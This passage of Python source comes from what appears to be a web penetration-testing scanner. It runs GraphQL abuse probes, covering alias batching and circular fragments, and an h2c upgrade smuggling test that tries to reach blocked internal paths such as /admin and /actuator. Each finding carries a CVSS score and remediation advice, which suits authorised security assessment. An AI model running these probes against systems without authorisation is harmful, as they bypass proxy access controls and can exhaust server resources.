                  "/query", "/gql", "/v1/graphql"]
    found_gql = None
    for gpath in _gql_paths:
        gql_url = url.rstrip("/") + gpath
        try:
            r = sess.post(gql_url,
                          json={"query": "{__typename}"},
                          timeout=timeout)
            if r.status_code == 200 and "data" in r.text:
                found_gql = gql_url
                break
        except Exception:
            pass

    if not found_gql:
        vc.log("[graphql_advanced] No GraphQL endpoint found — skipping", "INFO")
        vc.status(phase, "GraphQL Advanced", "complete", "No endpoint", 4, 4)
        return

    vc.log(f"[graphql_advanced] Testing GraphQL at {found_gql}", "INFO")

    # ── Test 1: Alias-based batching bypass ──
    vc.status(phase, "GraphQL Advanced", "running", "Alias batching", 1, 4)
    alias_query = "{ " + " ".join(
        f"a{i}: __typename" for i in range(10)
    ) + " }"
    try:
        r = sess.post(found_gql, json={"query": alias_query}, timeout=timeout)
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
                aliases_returned = len(data.get("data", {}))
                if aliases_returned >= 10:
                    _rq, _rp = _save_http_evidence(
                        out, phase, "gql_alias_batch", r, endpoint_url=found_gql)
                    out.add_finding(
                        title="GraphQL Alias-Based Batching",
                        url=found_gql, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The GraphQL endpoint at {found_gql} processed a query with "
                            f"10 aliased fields and returned all {aliases_returned} results. "
                            f"Alias-based batching can bypass per-query rate limiting and "
                            f"enable resource enumeration."
                        ),
                        output=(f"Query: {alias_query[:200]}\n"
                                f"Aliases returned: {aliases_returned}\n"
                                f"Response: {r.text[:300]}"),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-graphql-advanced",
                        service=target["scheme"], affected=found_gql,
                        owasp="A04:2025 Insecure Design", nist="SC-5",
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        cwe=["CWE-770"],
                        remediation=(
                            "Implement query complexity analysis that counts aliased "
                            "fields toward the complexity budget. Limit the number of "
                            "aliases per query."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[graphql_advanced] Alias batching accepted: {aliases_returned} aliases", "SUCCESS")
            except (json.JSONDecodeError, AttributeError):
                pass
    except Exception:
        pass

    # ── Test 2: Circular fragment detection ──
    vc.status(phase, "GraphQL Advanced", "running", "Circular fragments", 2, 4)
    # Use a short timeout to detect if the server hangs
    circ_query = (
        "query CircTest { __typename ...FragA } "
        "fragment FragA on Query { __typename ...FragB } "
        "fragment FragB on Query { __typename ...FragA }"
    )
    try:
        r = sess.post(found_gql, json={"query": circ_query}, timeout=3)
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
                errors = data.get("errors", [])
                # If no errors and query processed, server doesn't reject circular frags
                if not errors:
                    _rq, _rp = _save_http_evidence(
                        out, phase, "gql_circular_frag", r, endpoint_url=found_gql)
                    out.add_finding(
                        title="GraphQL Circular Fragment Accepted",
                        url=found_gql, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The GraphQL endpoint at {found_gql} accepted a query with "
                            f"circular fragment references (FragA→FragB→FragA) without "
                            f"returning an error. This indicates the server may be "
                            f"vulnerable to resource exhaustion via circular queries."
                        ),
                        output=(f"Query: {circ_query}\n"
                                f"Status: HTTP {r.status_code}\n"
                                f"Response: {r.text[:300]}"),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-graphql-advanced",
                        service=target["scheme"], affected=found_gql,
                        owasp="A04:2025 Insecure Design", nist="SC-5",
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
                        cwe=["CWE-674"],
                        remediation=(
                            "Implement query validation that detects and rejects circular "
                            "fragment references. Use a GraphQL query depth/complexity limiter."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log("[graphql_advanced] Circular fragments accepted", "SUCCESS")
            except (json.JSONDecodeError, AttributeError):
                pass
    except Exception:
        # Timeout may indicate the server tried to process the circular query
        vc.log("[graphql_advanced] Circular fragment query timed out (possible hang)", "INFO")

    # ── Test 3: Field duplication ──
    vc.status(phase, "GraphQL Advanced", "running", "Field duplication", 3, 4)
    dup_query = "{ " + " ".join(["__typename"] * 50) + " }"
    try:
        r = sess.post(found_gql, json={"query": dup_query}, timeout=timeout)
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
                if not data.get("errors"):
                    _fd_rq, _fd_rp = _save_http_evidence(
                        out, phase, "gql_field_dup", r, endpoint_url=found_gql)
                    out.add_finding(
                        title="GraphQL Field Duplication Not Limited",
                        url=found_gql, port=target["port"], risk="INFO",
                        description=(
                            f"The GraphQL endpoint at {found_gql} processed a query with "
                            f"50 duplicated fields without rejection. While not directly "
                            f"exploitable, this indicates missing query complexity limits."
                        ),
                        output=f"Query: {dup_query[:200]}…\nStatus: HTTP {r.status_code}",
                        output_file=f"{_fd_rq},{_fd_rp}",
                        sources="fracture-graphql-advanced",
                        service=target["scheme"], affected=found_gql,
                        owasp="A04:2025 Insecure Design", nist="SC-5",
                        cwe=["CWE-770"],
                        remediation=(
                            "Implement query complexity analysis that accounts for "
                            "duplicate fields. Set a maximum field count per query."
                        ),
                    )
                    vc.log("[graphql_advanced] Field duplication accepted (50 fields)", "SUCCESS")
            except (json.JSONDecodeError, AttributeError):
                pass
    except Exception:
        pass

    # ── Test 4: Debug/development extensions ──
    # GraphQL responses often include an `extensions` key with debug info
    try:
        r = sess.post(found_gql, json={"query": "{__typename}"}, timeout=timeout)
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
                extensions = data.get("extensions", {})
                if extensions:
                    _has_debug = False
                    ext_str = json.dumps(extensions)[:500]
                    if re.search(r'tracing|timing|sql|query|stack|debug|exception',
                                 ext_str, re.I):
                        _has_debug = True
                    if _has_debug or len(ext_str) > 100:
                        _rq, _rp = _save_http_evidence(
                            out, phase, "gql_debug_ext", r, endpoint_url=found_gql)
                        out.add_finding(
                            title="GraphQL Debug Extensions Exposed",
                            url=found_gql, port=target["port"], risk="MEDIUM",
                            description=(
                                f"The GraphQL endpoint at {found_gql} returns an 'extensions' "
                                f"field in responses containing debug or diagnostic information. "
                                f"This may expose internal timing data, SQL queries, stack traces, "
                                f"or other sensitive implementation details."
                            ),
                            output=f"Extensions content:\n{ext_str}",
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-graphql-advanced",
                            service=target["scheme"], affected=found_gql,
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            cvss_score=5.3,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                            cwe=["CWE-215"],
                            remediation=(
                                "Disable GraphQL debug extensions in production. "
                                "Remove tracing, timing, and diagnostic data from responses. "
                                "Configure the GraphQL server to suppress the extensions field."
                            ),
                            http_code=r.status_code,
                        )
                        vc.log("[graphql_advanced] Debug extensions exposed", "SUCCESS")
            except (json.JSONDecodeError, AttributeError):
                pass
    except Exception:
        pass

    vc.status(phase, "GraphQL Advanced", "complete", "Done", 4, 4)
    vc.log("[graphql_advanced] Phase complete", "SUCCESS")

# ── Group E: h2c Smuggling ─────────────────────────────────────────────
def _test_h2c_smuggling(target: dict, cfg: dict, out: "OutputManager",
                        sess: "requests.Session") -> None:
    """Test HTTP/2 cleartext (h2c) upgrade smuggling.

    Checks whether the reverse proxy/load balancer forwards h2c upgrade
    requests to the backend, potentially allowing bypass of proxy-level
    access controls.  Also probes internal paths via h2c to detect
    endpoints reachable only after the upgrade.
    """
    import socket as _sock, ssl as _ssl2, select as _sel2

    phase    = "request_smuggling"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]
    scheme   = target["scheme"]
    timeout  = cfg.get("timeout", 10)
    use_tls  = scheme == "https"

    vc.status(phase, "h2c Smuggling", "running", "Testing h2c upgrade", 0, 2)

    # ── Raw-socket helpers (same pattern as _phase_request_smuggling) ─────

    def _raw_connect(connect_timeout=None):
        ct = connect_timeout or 3
        sock = _sock.create_connection((hostname, port), timeout=ct)
        sock.settimeout(None)
        if use_tls:
            ctx = _ssl2.create_default_context()
            if not cfg.get("verify_ssl", False):
                ctx.check_hostname = False
                ctx.verify_mode = _ssl2.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=hostname)
        return sock

    def _recv(sock, max_wait=5.0):
        buf = b""
        deadline = time.time() + max_wait
        while time.time() < deadline:
            rem = max(deadline - time.time(), 0.05)
            ready = _sel2.select([sock], [], [], min(rem, 1.0))
            if not ready[0]:
                if buf:
                    break
                continue
            try:
                chunk = sock.recv(8192)
            except (_sock.error, _ssl2.SSLError, OSError):
                break
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                _tail_deadline = time.time() + 0.5
                while time.time() < _tail_deadline:
                    r2 = _sel2.select([sock], [], [], 0.3)
                    if not r2[0]:
                        break
                    try:
                        c2 = sock.recv(8192)
                    except (_sock.error, _ssl2.SSLError, OSError):
                        break
                    if not c2:
                        break
                    buf += c2
                break
        return buf

    def _status_code(raw: bytes) -> int:
        try:
            return int(raw.split(b"\r\n")[0].split()[1])
        except (IndexError, ValueError):
            return 0

    def _close(sock):
        try:
            sock.close()
        except Exception:
            pass

    def _save_h2c_evidence(label: str, content: str) -> str:
        try:
            d = out.root / phase
            d.mkdir(parents=True, exist_ok=True)
            _safe_label = re.sub(r'[^a-zA-Z0-9_]', '_', label)[:50]
            fp = d / f"{_safe_label}.txt"
            fp.write_text(content)
            return str(fp.relative_to(out.root))
        except Exception:
            return ""

    # Cookies from the session for authenticated probing
    _cookies = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
    _ck = f"Cookie: {_cookies}\r\n" if _cookies else ""

    # Valid base64-encoded HTTP/2 SETTINGS frame (empty SETTINGS, standard)
    _h2_settings = "AAMAAABkAARAAAAAAAIAAAAA"

    # ── Step 1: Test h2c upgrade on base path ─────────────────────────────

    h2c_supported = False
    try:
        sock = _raw_connect(connect_timeout=3)
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {hostname}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: {_h2_settings}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"{_ck}"
            f"\r\n"
        ).encode()
        sock.sendall(req)
        resp = _recv(sock, max_wait=5.0)
        code = _status_code(resp)
        _close(sock)

        if code == 101:
            h2c_supported = True
            ev = _save_h2c_evidence(
                "h2c_upgrade_accepted",
                f"=== h2c Upgrade Accepted ===\n"
                f"Target: {url}\n\n"
                f"--- Request ---\n{req.decode(errors='replace')}\n"
                f"--- Response (HTTP {code}) ---\n"
                f"{resp.decode(errors='replace')[:1500]}\n")
            out.add_finding(
                title="HTTP/2 Cleartext Upgrade (h2c) Accepted",
                url=url, port=port, risk="MEDIUM",
                description=(
                    f"The server at {hostname}:{port} accepted an HTTP/2 "
                    f"cleartext (h2c) upgrade request and responded with 101 "
                    f"Switching Protocols.  If a reverse proxy is in front, "
                    f"it may stop inspecting traffic after the upgrade, "
                    f"allowing an attacker to bypass proxy-level access "
                    f"controls, WAF rules, and authentication enforcement.  "
                    f"This is a known technique for smuggling requests past "
                    f"reverse proxies that do not strip the Upgrade header."),
                output=(
                    f"GET / with Upgrade: h2c → HTTP {code}\n"
                    f"HTTP2-Settings: {_h2_settings}\n"
                    f"Response: {resp.decode(errors='replace')[:300]}"),
                output_file=ev,
                sources="fracture-h2c-smuggling", service=scheme,
                affected=url, cves="",
                owasp="A05:2025 Security Misconfiguration",
                nist="SC-8",
                cvss_score=5.3,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                cwe=["CWE-444"],
                remediation=(
                    "Configure the reverse proxy to strip Upgrade and "
                    "HTTP2-Settings headers from client requests.  If h2c "
                    "is not required, disable HTTP/2 cleartext support on "
                    "backend servers.  Use HTTP/2 over TLS (h2) instead."),
            )
            vc.log(f"[h2c_smuggling] h2c upgrade accepted at {url}", "SUCCESS")
        else:
            vc.log(f"[h2c_smuggling] h2c upgrade rejected (HTTP {code})", "INFO")

    except (ConnectionRefusedError, ConnectionResetError, OSError,
            _sock.timeout, _ssl2.SSLError) as e:
        vc.log(f"[h2c_smuggling] Connection failed for h2c test: {e}", "INFO")
    except Exception as e:
        vc.log(f"[h2c_smuggling] h2c test error: {e}", "INFO")

    vc.status(phase, "h2c Smuggling", "running", "Internal path probe", 1, 2)

    # ── Step 2: Probe internal paths via h2c ──────────────────────────────
    # Only meaningful if h2c upgrade was accepted — attempt to reach paths
    # that are normally blocked at the proxy layer.

    if h2c_supported:
        _internal_paths = [
            "/admin", "/internal", "/actuator", "/metrics",
            "/debug", "/server-status",
        ]

        # First, establish baselines via normal requests (through the proxy)
        _baselines: dict = {}
        for ipath in _internal_paths:
            try:
                _burl = f"{scheme}://{hostname}:{port}{ipath}"
                r = sess.get(_burl, timeout=timeout, allow_redirects=False)
                _baselines[ipath] = r.status_code
            except Exception:
                _baselines[ipath] = 0

        # Now test the same paths via h2c upgrade
        for ipath in _internal_paths:
            baseline = _baselines.get(ipath, 0)
            # Only interesting if the path was blocked normally (403/404/401)
            if baseline not in (401, 403, 404, 0):
                continue
            try:
                sock = _raw_connect(connect_timeout=3)
                req = (
                    f"GET {ipath} HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"Upgrade: h2c\r\n"
                    f"HTTP2-Settings: {_h2_settings}\r\n"
                    f"Connection: Upgrade, HTTP2-Settings\r\n"
                    f"{_ck}"
                    f"\r\n"
                ).encode()
                sock.sendall(req)
                resp = _recv(sock, max_wait=5.0)
                code = _status_code(resp)
                _close(sock)

                # If we get 101 or 200 on a normally-blocked path, it's a bypass
                if code in (101, 200) and baseline in (401, 403, 404):
                    _resp_text = resp.decode(errors="replace")
                    _hdr_end = resp.find(b"\r\n\r\n")
                    _body_preview = _resp_text[_hdr_end + 4:][:300] if _hdr_end >= 0 else "(no body)"
                    ev = _save_h2c_evidence(
                        f"h2c_bypass_{ipath.strip('/').replace('/', '_')}",
                        f"=== h2c Internal Endpoint Bypass ===\n"
                        f"Path: {ipath}\n"
                        f"Normal access: HTTP {baseline} (blocked)\n"
                        f"Via h2c upgrade: HTTP {code} (accessible)\n\n"
                        f"--- Request ---\n{req.decode(errors='replace')}\n"
                        f"--- Response ---\n"
                        f"{_resp_text[:2000]}\n")
                    out.add_finding(
                        title=f"h2c Smuggling — Internal Endpoint Accessible: {ipath}",
                        url=f"{scheme}://{hostname}:{port}{ipath}",
                        port=port, risk="HIGH",
                        description=(
                            f"The internal endpoint '{ipath}' returned HTTP "
                            f"{code} when accessed via an h2c upgrade request, "
                            f"but HTTP {baseline} through normal access.  This "
                            f"indicates the reverse proxy blocks direct access "
                            f"to this path but forwards the request after the "
                            f"h2c protocol switch, bypassing proxy-level "
                            f"access controls.  An attacker can use this to "
                            f"reach administrative, debug, or monitoring "
                            f"endpoints that are intended to be internal-only."),
                        output=(
                            f"Normal: GET {ipath} → HTTP {baseline}\n"
                            f"Via h2c: GET {ipath} with Upgrade: h2c → "
                            f"HTTP {code}\n"
                            f"Body preview: {_body_preview}"),
                        output_file=ev,
                        sources="fracture-h2c-smuggling", service=scheme,
                        affected=_clean_url(scheme, hostname, port, ipath),
                        cves="",
                        owasp="A01:2025 Broken Access Control",
                        nist="AC-3",
                        cvss_score=7.5,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        cwe=["CWE-444", "CWE-284"],
                        remediation=(
                            "Strip the Upgrade header at the reverse proxy for "
                            "all inbound requests.  Apply path-based access "
                            "controls at both the proxy and backend layers.  "
                            "Disable h2c on backend servers if not required."),
                    )
                    vc.log(
                        f"[h2c_smuggling] BYPASS: {ipath} accessible via h2c "
                        f"(normal={baseline}, h2c={code})", "SUCCESS")

            except (ConnectionRefusedError, ConnectionResetError, OSError,
                    _sock.timeout, _ssl2.SSLError):
                pass
            except Exception:
                pass

    vc.status(phase, "h2c Smuggling", "complete", "Done", 2, 2)
    vc.log("[h2c_smuggling] h2c smuggling tests complete", "INFO")

# Phases run for every credential context (full scan for role 1).
# Reduced contexts (roles 2..n and unauthenticated) only run this subset.
_REDUCED_SCAN_PHASES: frozenset = frozenset({
    "headers", "shcheck", "auth_bypass", "account_lockout", "session", "csrf", "bfla",
})


def _prompt_multi_role_setup(auth_cfg: dict) -> int:
    """
    Ask how many authenticated user roles to test.
    If n > 1 and credentials are already configured, confirm they belong to the
    most permissive user; if not, prompt for replacement credentials.
    Modifies auth_cfg in-place when new credentials are provided.
    Returns the number of authenticated roles (0 = unauthenticated only).
    """
    raw = vc.prompt(
        "How many authenticated user roles will be tested (not including unauthenticated)?",
        prompt_type="text",
        skippable=True,
    ).strip()
    if not raw:
        return 0
    try:
        n = int(raw)
        if n < 0:
            n = 0
    except ValueError:
        n = 0

    if n == 0:
        return 0

    _has_creds = bool(
        auth_cfg.get("enabled") and (auth_cfg.get("username") or auth_cfg.get("auth_token"))
    )

    if _has_creds and n > 1:
        _u = auth_cfg.get("username") or "(token)"
        _ans = vc.prompt(
            f"Credentials are configured for '{_u}'. Are these for the most permissive user?",
            prompt_type="confirm",
            options=["Yes", "No"],
        ).strip().lower()
        if _ans in ("no", "n", "2"):
            _has_creds = False

    if not _has_creds:
        _uname = vc.prompt("Username (most permissive user — role 1)", prompt_type="text").strip()
        _pwd   = vc.prompt("Password (most permissive user — role 1)", prompt_type="password")
        auth_cfg["enabled"]      = True
        auth_cfg["username"]     = _uname
        auth_cfg["password"]     = _pwd

    # Always ask for role name — required for both TTY and Crucible modal context
    _lbl = vc.prompt(
        "Role name for role 1 (e.g. Admin, Editor, Staff)",
        prompt_type="text",
    ).strip() or "elevated"
    auth_cfg["_role_label"] = _lbl

    return n


def _prompt_next_role_creds(role_num: int, total: int) -> dict:
    """
    Prompt for credentials for role_num of total authenticated roles.
    Returns {"role": label, "username": u, "password": p}.
    """
    _uname = vc.prompt(
        f"Username (role {role_num}/{total})", prompt_type="text"
    ).strip() or f"user{role_num}"
    _pwd  = vc.prompt(f"Password (role {role_num}/{total})", prompt_type="password")
    _lbl  = vc.prompt(
        f"Role name for role {role_num} (e.g. User, Manager, Viewer)",
        prompt_type="text",
    ).strip() or f"user{role_num}"
    return {"role": _lbl, "username": _uname, "password": _pwd}


def main() -> None:
    args = _parse_args()

    if args.list_phases:
        print("\nFracture Phases:\n")
        for name, desc in PHASE_LIST:
            print(f"  {name:<20} {desc}")
        print()
        return

    # Load settings
    settings = _load_settings(args.settings or "")
    cfg      = settings["scan"]

    # Apply CLI overrides
    if args.url:
        cfg["target_url"] = args.url
    if args.project:
        cfg["project"] = args.project
    if args.threads:
        cfg["threads"] = args.threads
    if args.timeout:
        cfg["timeout"] = args.timeout
    if args.no_injection:
        cfg["phases"]["injection"] = False
    if args.no_vulnscan:
        cfg["phases"]["vulnscan"] = False
    if args.no_ffuf:
        cfg["phases"]["ffuf"] = False
    if args.no_auth:
        for auth_phase in ("auth_recon", "authorization", "session", "csrf", "cross_user", "logout"):
            cfg["phases"][auth_phase] = False
    if getattr(args, "no_cve_correlation", False):
        cfg["no_cve_correlation"] = True
    if args.browser_auth:
        cfg["browser_auth"] = True
    if args.chromedriver:
        cfg["chromedriver_path"] = args.chromedriver

    # CLI auth overrides
    if args.username:
        cfg["auth"]["enabled"]   = True
        cfg["auth"]["username"]  = args.username
        cfg["auth"]["password"]  = args.password or ""
        cfg["auth"]["auth_type"] = args.auth_type or "form"
    if args.login_url:
        cfg["auth"]["login_url"] = args.login_url
    if args.auth_token:
        cfg["auth"]["enabled"]    = True
        cfg["auth"]["auth_token"] = args.auth_token

    # Auto-compute structured project path from engagement fields if not explicitly set
    if not cfg.get("project"):
        eng = settings.get("engagement", {})
        cfg["project"] = str(_build_project_dir(
            eng.get("client_short", ""),
            eng.get("start_date", ""),
            "fracture",
        ))

    # Determine target URLs
    target_url  = cfg.get("target_url", "").rstrip("/")
    target_urls = [u.rstrip("/") for u in cfg.get("target_urls", []) if u]
    if target_url:
        target_urls = [target_url] + [u for u in target_urls if u != target_url]
    # Ensure every target has a scheme (bare ip:port → https:// or http://)
    _normed: list = []
    for _tu in target_urls:
        if _tu and "://" not in _tu:
            _tu = _parse_target(_tu)["url"]
        _normed.append(_tu)
    target_urls = _normed
    # Deduplicate while preserving order
    _seen_urls: set = set()
    target_urls = [u for u in target_urls if u not in _seen_urls and not _seen_urls.add(u)]
    if not target_urls:
        vc.log("No target URL specified. Use --url or set target_url in settings.", "ERROR")
        sys.exit(1)

    _print_banner()

    vc.log(f"Fracture v{VERSION} starting", "INFO")
    vc._target_total = len(target_urls)
    vc.log(f"Target(s): {', '.join(target_urls)}", "INFO")
    vc.log(f"Project:   {cfg['project']}", "INFO")
    vc.log(f"Phases:    {', '.join(k for k, v in cfg['phases'].items() if v)}", "INFO")

    # Scope hostnames: set of all configured target hostnames
    _scope_hostnames: set = {
        urllib.parse.urlparse(u).hostname for u in target_urls if u
    }

    # Auto-scope the login page: when auth is configured and the login URL
    # is on a different host, add it to scope so it gets tested.  The login
    # page is part of the authentication surface and must be assessed even
    # if the user only targeted the application host.
    _login_url_cfg = cfg.get("auth", {}).get("login_url", "").strip()
    if _login_url_cfg:
        _login_host = urllib.parse.urlparse(_login_url_cfg).hostname
        if _login_host and _login_host not in _scope_hostnames:
            _scope_hostnames.add(_login_host)
            vc.log(f"[scope] Auto-added login page host to scope: {_login_host}", "INFO")

    # Pending URL queue — grows when in-scope redirects are discovered during scanning
    _pending_urls:        list = list(target_urls)
    _processed_urls:      set  = set()
    _redirect_discovered: set  = set()  # tracks redirect-discovered target URLs
    _pending_idx = 0

    # If the login URL is on a newly-scoped host, add its origin to the queue
    # so it gets full phase coverage like any other target.
    if _login_url_cfg:
        _login_parsed = urllib.parse.urlparse(_login_url_cfg)
        _login_origin = f"{_login_parsed.scheme}://{_login_parsed.netloc}"
        if _login_origin not in _pending_urls and _login_url_cfg not in _pending_urls:
            _pending_urls.append(_login_url_cfg)
            vc.log(f"[scope] Auto-queued login page for scanning: {_login_url_cfg}", "INFO")

    # Start adaptive concurrency monitor (adjusts _SCAN_SEM based on CPU/RAM)
    _start_concurrency_monitor(_SCAN_SEM)
    _start_oom_watchdog()

    # ── Plugin / database updates ────────────────────────────────────────────
    vc.status("init_updates", label="INIT: Plugin Updates", status="running")
    _update_results: dict = {}

    _nuclei_bin = _find_tool("nuclei")
    if _nuclei_bin:
        vc.status("init_updates", label="INIT: Plugin Updates", status="running",
                  step="nuclei -update-templates")
        print(f"{Fore.CYAN}[*] Updating nuclei templates...{Style.RESET_ALL}", flush=True)
        _nuc_r = "failed"
        try:
            _nuc_upd = subprocess.run(
                [_nuclei_bin, "-update-templates"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, timeout=300)
            _nuc_r = "updated" if _nuc_upd.returncode == 0 else "skipped"
        except subprocess.TimeoutExpired:
            _nuc_r = "timed out"
        except Exception:
            pass
        _update_results["nuclei"] = _nuc_r
        print(f"{Fore.GREEN if _nuc_r == 'updated' else Fore.YELLOW}"
              f"[{'+'if _nuc_r=='updated' else '~'}] nuclei templates: {_nuc_r}"
              f"{Style.RESET_ALL}")
    else:
        _update_results["nuclei"] = "not-installed"

    _wpscan_bin = _find_tool("wpscan")
    if _wpscan_bin:
        vc.status("init_updates", label="INIT: Plugin Updates", status="running",
                  step="wpscan --update")
        print(f"{Fore.CYAN}[*] Updating wpscan database...{Style.RESET_ALL}", flush=True)
        _wp_r = "failed"
        try:
            _wp_upd = subprocess.run(
                [_wpscan_bin, "--update"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, timeout=180)
            _wp_r = "updated" if _wp_upd.returncode == 0 else "skipped"
        except subprocess.TimeoutExpired:
            _wp_r = "timed out"
        except Exception:
            pass
        _update_results["wpscan"] = _wp_r
        print(f"{Fore.GREEN if _wp_r == 'updated' else Fore.YELLOW}"
              f"[{'+'if _wp_r=='updated' else '~'}] wpscan database: {_wp_r}"
              f"{Style.RESET_ALL}")
    else:
        _update_results["wpscan"] = "not-installed"

    _ss_bin = _find_tool("searchsploit")
    if _ss_bin:
        vc.status("init_updates", label="INIT: Plugin Updates", status="running",
                  step="searchsploit -u")
        print(f"{Fore.CYAN}[*] Updating searchsploit database...{Style.RESET_ALL}", flush=True)
        _ss_r = "failed"
        try:
            _ss_upd = subprocess.run(
                [_ss_bin, "-u"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, timeout=300)
            _ss_r = "updated" if _ss_upd.returncode == 0 else "skipped"
        except subprocess.TimeoutExpired:
            _ss_r = "timed out"
        except Exception:
            pass
        _update_results["searchsploit"] = _ss_r
        print(f"{Fore.GREEN if _ss_r == 'updated' else Fore.YELLOW}"
              f"[{'+'if _ss_r=='updated' else '~'}] searchsploit: {_ss_r}"
              f"{Style.RESET_ALL}")
    else:
        _update_results["searchsploit"] = "not-installed"

    vc.status("init_updates", label="INIT: Plugin Updates", status="complete",
              tools=_update_results)

    global _pause_mgr
    _fr_proj_root = Path(cfg["project"]).resolve()
    _fr_proj_root.mkdir(parents=True, exist_ok=True)
    if _pp is not None:
        _pause_mgr = _pp.PauseManager(_fr_proj_root, "fracture")
        _pause_mgr.start_watcher(grace_period=30)
        _pause_mgr.log_run_type(
            (_fr_proj_root / "checkpoint.json").exists())

    _check_pause()

    # ── Multi-role testing setup ─────────────────────────────────────────────
    # _n_roles: number of authenticated roles to test (0 = unauthenticated only)
    # _collected_roles: grows as the user provides credentials during the scan;
    #   reused across targets so the user is only prompted once per role.
    _n_roles: int = 0
    _collected_roles: list = []  # [{"role": label, "username": u, "password": p}, ...]
    # Persists built auth sessions across while-loop iterations so that redirect-discovered
    # secondary targets reuse the same sessions rather than re-authenticating.
    # Keys: 0..n for role_idx, "auth2" for the secondary auth config.
    _role_sessions: dict = {}
    # Discovery leader tracking — the role whose busting results are considered most
    # authoritative. Initialised to empty; set to the first role that runs busting.
    _discovery_leader: str = ""
    _discovery_leader_score: dict = {"score": 0, "n200": 0, "n200_priv": 0}
    # Sessions of all roles that have completed their context, keyed by role label.
    # Used by _retroactive_probe to populate access matrix entries for newly found URLs.
    _completed_role_sessions: dict = {}
    _role_landing_urls: dict = {}  # {role_label: landing_url} — per-role canary targets

    _am = cfg.get("auth_matrix") or []
    if _CRUCIBLE_MANAGED and _am:
        # Roles were pre-defined in the Crucible project — load them directly,
        # no prompt needed.
        _n_roles = len(_am)
        _collected_roles = [
            {
                "role":     r.get("role") or ("elevated" if i == 0 else f"user{i}"),
                "username": r.get("username", ""),
                "password": r.get("password", ""),
            }
            for i, r in enumerate(_am)
        ]
        # Ensure cfg["auth"] reflects role 1 so _build_auth_session works
        if _collected_roles:
            cfg["auth"]["enabled"]  = True
            cfg["auth"]["username"] = _collected_roles[0]["username"]
            cfg["auth"]["password"] = _collected_roles[0]["password"]
        # Guard: login_username_field / login_password_field must be HTML form
        # field names (e.g. "username", "password"), NOT credential values.
        # Crucible misconfiguration can swap them.  Check against ALL matrix
        # credentials — any match means the field name IS a credential.
        _all_cred_vals = set()
        for _cr in _am:
            if _cr.get("username"):
                _all_cred_vals.add(_cr["username"])
            if _cr.get("password"):
                _all_cred_vals.add(_cr["password"])
        _uf_cfg = cfg["auth"].get("login_username_field", "username")
        _pf_cfg = cfg["auth"].get("login_password_field", "password")
        if _uf_cfg in _all_cred_vals:
            vc.log(
                f"[auth] login_username_field contains a credential value "
                f"({_uf_cfg!r}) — resetting to 'username'",
                "WARNING",
            )
            cfg["auth"]["login_username_field"] = "username"
        if _pf_cfg in _all_cred_vals:
            vc.log(
                "[auth] login_password_field contains a credential value "
                "— resetting to 'password'",
                "WARNING",
            )
            cfg["auth"]["login_password_field"] = "password"
        vc.log(
            f"[multi-role] {_n_roles} role(s) loaded from project settings — skipping prompt",
            "INFO",
        )
        # Seed the global role list immediately so preliminary access_matrix
        # writes during recon/gobuster already carry the correct column names.
        _all_roles_ctx[:] = [r["role"] for r in _collected_roles]
        if "unauthenticated" not in _all_roles_ctx:
            _all_roles_ctx.append("unauthenticated")
    elif _CRUCIBLE_MANAGED:
        # Managed mode with no auth_matrix — run unauthenticated only.
        # Do NOT prompt; the operator is in Crucible and cannot
        # interact with Fracture's stdin.
        _n_roles = 0
        vc.log(
            "[multi-role] No auth_matrix in project settings — running "
            "unauthenticated only (managed mode, no prompt)",
            "INFO",
        )
    else:
        _n_roles = _prompt_multi_role_setup(cfg["auth"])
        if _n_roles >= 1:
            _r1_lbl = cfg["auth"].pop("_role_label", None) or cfg["auth"].get("username") or "elevated"
            _collected_roles.append({
                "role":     _r1_lbl,
                "username": cfg["auth"].get("username", ""),
                "password": cfg["auth"].get("password", ""),
            })
            # Seed with at least role 1 + unauthenticated; extended as more roles are added
            _all_roles_ctx[:] = [r["role"] for r in _collected_roles]
            if "unauthenticated" not in _all_roles_ctx:
                _all_roles_ctx.append("unauthenticated")

    while _pending_idx < len(_pending_urls):
        _check_pause()
        raw_url      = _pending_urls[_pending_idx]
        _pending_idx += 1
        if not raw_url or raw_url in _processed_urls:
            continue
        _processed_urls.add(raw_url)
        vc._current_target = raw_url
        vc._target_index = _pending_idx
        _is_redirect_target = raw_url in _redirect_discovered
        # Reset per-target discovery state for non-redirect (genuine new primary targets).
        # Redirect-discovered secondaries inherit the leader from their parent scan so
        # session reuse works; genuine new targets start fresh.
        if not _is_redirect_target:
            _discovery_leader = ""
            _discovery_leader_score = {"score": 0, "n200": 0, "n200_priv": 0}
            _completed_role_sessions = {}

        target = _parse_target(raw_url)
        project_dir = Path(cfg["project"]).resolve()
        if len(target_urls) > 1 or _is_redirect_target:
            # Sub-directory per target
